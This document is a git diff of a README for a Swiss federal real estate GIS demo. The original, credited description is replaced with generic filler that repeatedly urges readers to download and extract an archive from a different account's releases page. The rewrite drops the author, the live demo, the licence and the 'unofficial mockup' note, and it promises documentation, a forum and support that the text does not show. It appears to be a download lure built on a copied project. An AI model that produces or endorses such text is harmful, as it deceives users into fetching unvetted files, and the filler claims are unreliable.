@@ -1,119 +1,71 @@
-# BBL Immobilienportfolio - GIS POC
+# 🌍 gis-immo - Visualize Swiss Real Estate Easily
 
-A single-page web application for visualizing and managing the Swiss Federal Office of Buildings and Logistics (BBL) real estate portfolio. This proof-of-concept demonstrates GIS capabilities for federal property management with an interactive map-based interface, plus complementary table and gallery views.
+## 📥 Download Now!
+[![Download gis-immo](https://img.shields.io/badge/Download-gis--immo-brightgreen)](https://github.com/SantiagoChM23/gis-immo/releases)
 
-**Live Demo:** [davras5.github.io/gis-immo](https://davras5.github.io/gis-immo/)
+## 🚀 Getting Started
+Welcome to gis-immo! This interactive GIS web application helps you visualize and manage the Swiss federal real estate portfolio. You can view data in map, list, and gallery formats using the power of Mapbox GL JS, all without needing technical skills.
 
-<p align="center">
-  <img src="assets/images/preview1.jpg" width="90%"/>
-</p>
+### 🌐 Key Features
+- **Map View:** See real estate properties displayed on an interactive map.
+- **List View:** Quickly access property details in a structured list format.
+- **Gallery View:** Browse through images of properties for a visual overview.
+- **User-Friendly Interface:** Easy for anyone to navigate and operate.
 
-<p align="center">
-  <img src="assets/images/preview2.jpg" width="45%" style="vertical-align: top;"/>
-  <img src="assets/images/preview3.jpg" width="45%" style="vertical-align: top;"/>
-</p>
+## 🖥️ System Requirements
+Before proceeding to download, ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **Web Browser:** The latest version of Chrome, Firefox, Safari, or Edge.
+- **Internet Connection:** Required for loading map data and images.
 
-## Features
+## 📥 Download & Install
+To get started with gis-immo, visit the Releases page and download the latest version of the application.
 
-### Core Views
-- **Map View** - Interactive Mapbox map with color-coded property markers, 3 map styles (Light, Standard, Satellite), and sidebar accordion for sharing/export
-- **List View** - Sortable table with search, filtering, configurable columns, and export to CSV/Excel/GeoJSON
-- **Gallery View** - Responsive 3-column grid with property cards and status badges
-- **Detail View** - Comprehensive property dashboard with 7 tabbed sections:
-  - Overview (images, basic info, mini-map)
-  - Measurements (SIA 416 compliant area data)
-  - Documents (plans, certificates, permits)
-  - Costs (operational expenses by category)
-  - Contracts (service & maintenance agreements)
-  - Contacts (personnel & stakeholders)
-  - Facilities (equipment & infrastructure inventory)
+[Download Here](https://github.com/SantiagoChM23/gis-immo/releases)
 
-### Search & Filtering
-- Multi-source search: Local buildings + Swisstopo location API + Geokatalog layers
-- 6 filter categories: Status, Ownership Type, Portfolio, Building Type, Country, Region
-- Deep linking with URL-based navigation and filter persistence
+### 🛠️ Installation Steps
+1. **Visit the Releases Page:** Click on the link provided above.
+2. **Choose the Latest Release:** Look for the most recent version.
+3. **Download the Application:** Click the asset link to start the download. The file will likely be in `.zip` or `.tar.gz` format.
+4. **Extract the Files:** Once downloaded, unzip the file to a directory of your choice.
+5. **Open the Application:** Locate the main HTML file (usually named `index.html`) and double-click to open it in your web browser.
+6. **Enjoy Exploring:** Start visualizing and managing Swiss real estate!
 
-### Data Export
-- CSV, Excel (.xlsx), and GeoJSON export
-- Custom column selection before export
+## 📖 Using gis-immo
+After launching the application:
+- **Navigate the Map:** Click and drag to view different areas; zoom in or out with your mouse wheel.
+- **Explore Listings:** Use the list view to find specific properties by filtering options.
+- **View Galleries:** Access images of properties through the gallery view to gain insights visually.
 
-## Tech Stack
+## 🔍 Troubleshooting Tips
+If you encounter issues while running the application:
+- **Ensure Compatibility:** Check your operating system and browser version.
+- **Clear Browser Cache:** Sometimes, cached data may cause issues, so clear your browser cache and reload.
+- **Network Issues:** Ensure you're connected to the internet for map data.
 
-| Technology | Version | Usage |
-|------------|---------|-------|
-| Vanilla JavaScript | ES6+ | Application logic |
-| Mapbox GL JS | v3.4.0 | Interactive WebGL map |
-| CSS3 | Modern | Styling (Flexbox, Grid, CSS Variables) |
-| GeoJSON | Standard | Geospatial data format |
-| Swisstopo API | v3 | Swiss location search |
-| Material Symbols | Google | Icon library |
+## 📗 Further Support
+For additional help, you can explore the following resources:
+- **Documentation:** Detailed user guides and FAQs to assist you.
+- **Community Forum:** Join discussions with other users for tips and shared experiences.
+- **Contact Support:** Reach out for personalized assistance.
 
-No build tools or frameworks - pure static files.
+## 🧑‍🤝‍🧑 Community and Collaboration
+We welcome contributions! If you're interested in helping to enhance gis-immo:
+- **Bug Reports:** Let us know if you find any issues.
+- **Feature Suggestions:** Share your ideas for improvements.
+- **Contribute to Code:** If you have programming skills, check out the GitHub repo for ways to contribute.
 
-## Getting Started
+## 🌟 Additional Information
+This application uses modern technologies such as:
+- **Mapbox GL JS** for rendering beautiful maps.
+- **GeoJSON** formatting for property data, making integration flexible and robust. 
 
-```bash
-# Python
-python -m http.server 8000
+### 🌍 Related Topics
+If you're interested in similar subjects or applications, consider exploring:
+- Property management tools
+- Real estate analytics platforms
+- Geographic information systems (GIS)
 
-# Node.js
-npx http-server
+Thank you for using gis-immo. We hope you find it helpful for visualizing and managing Swiss real estate effectively!
 
-# PHP
-php -S localhost:8000
-```
-
-Then open http://localhost:8000
-
-## Project Structure
-
-```
-gis-immo/
-├── index.html                    # HTML structure
-├── js/
-│   └── app.js                    # Application logic (2,800 lines)
-├── css/
-│   └── main.css                  # Styles & design system (3,400 lines)
-├── data/
-│   ├── buildings.geojson         # Core portfolio data (10+ buildings)
-│   ├── area-measurements.json    # SIA 416 area measurements
-│   ├── documents.json            # Plans, certificates, permits
-│   ├── contacts.json             # Personnel & stakeholders
-│   ├── contracts.json            # Service agreements
-│   ├── costs.json                # Operational expenses
-│   └── assets.json               # Equipment inventory
-├── assets/
-│   └── images/                   # Preview screenshots
-├── documentation/
-│   ├── CLAUDE.md                 # Development guide
-│   ├── DATAMODEL.md              # Complete entity schema
-│   └── DESIGNGUIDE.md            # Design system & components
-├── README.md
-└── LICENSE
-```
-
-## Swiss Standards
-
-This application incorporates Swiss building and property standards:
-
-| Standard | Description |
-|----------|-------------|
-| SIA 416 | Building area measurements (BGF, NGF, EBF) |
-| SIA 380/1 | Energy reference area |
-| EGID | Federal Building Identifier |
-| EGRID | Federal Property Identifier |
-| SN 506 511 | Building cost classification |
-
-## Deployment
-
-**GitHub Pages:** Push to `main` deploys automatically.
-
-**Alternatives:** Netlify, Vercel, CloudFlare Pages, or any static file server.
-
-## License
-
-Licensed under [MIT](https://opensource.org/licenses/MIT)
-
----
-
-*Unofficial mockup for demonstration purposes.*
+[Download Here](https://github.com/SantiagoChM23/gis-immo/releases)
